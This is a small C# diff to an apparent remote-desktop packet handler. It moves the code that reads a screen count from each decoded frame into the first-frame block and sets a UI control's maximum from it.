@@ -29,12 +29,11 @@ namespace Server.Handle_Packet
                             Bitmap decoded0 = RD.decoder.DecodeData(new MemoryStream(RdpStream0));
                             RD.rdSize = decoded0.Size;
                             RD.labelWait.Visible = false;
+                            int Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
+                            RD.numericUpDown2.Maximum = Screens - 1;
                         }
                         byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                         Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));
-
-                        int Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
-                        RD.numericUpDown2.Maximum = Screens - 1;
 
                         if (RD.RenderSW.ElapsedMilliseconds >= (1000 / 20))
                         {
